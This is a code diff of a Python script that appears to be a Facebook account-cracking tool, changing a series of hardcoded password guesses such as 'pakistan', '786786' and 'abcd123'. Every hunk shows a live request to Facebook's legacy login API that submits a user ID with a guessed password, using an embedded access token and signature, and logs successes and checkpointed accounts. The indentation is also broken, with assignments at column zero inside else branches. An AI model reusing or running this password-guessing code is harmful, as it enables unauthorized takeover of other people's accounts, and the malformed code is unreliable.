@@ -1355,7 +1355,7 @@ pass64 = 'qwertyuiop'
 					cek.close()
 					cekpoint.append(user+pass2)
                                   else:
-pass64 = 'qwertyuiop'
+pass64 = 'pakistan'
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
@@ -1369,7 +1369,7 @@ pass64 = 'qwertyuiop'
 					cek.close()
 					cekpoint.append(user+pass2)
                                   else:
-pass64 = 'qwertyuiop'
+pass64 = '999999'
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
@@ -1383,7 +1383,7 @@ pass64 = 'qwertyuiop'
 					cek.close()
 					cekpoint.append(user+pass2)
                                   else:
-pass64 = 'qwertyuiop'
+pass64 = '786786'
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
@@ -1397,7 +1397,7 @@ pass64 = 'qwertyuiop'
 					cek.close()
 					cekpoint.append(user+pass2)
                                   else:
-pass64 = 'qwertyuiop'
+pass64 = 'abcd'
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
@@ -1411,7 +1411,7 @@ pass64 = 'qwertyuiop'
 					cek.close()
 					cekpoint.append(user+pass2)
                                   else:
-pass64 = 'qwertyuiop'
+pass64 = 'abcd12'
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
@@ -1425,7 +1425,7 @@ pass64 = 'qwertyuiop'
 					cek.close()
 					cekpoint.append(user+pass2)
                                   else:
-pass64 = 'qwertyuiop'
+pass64 = 'abcd123'
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
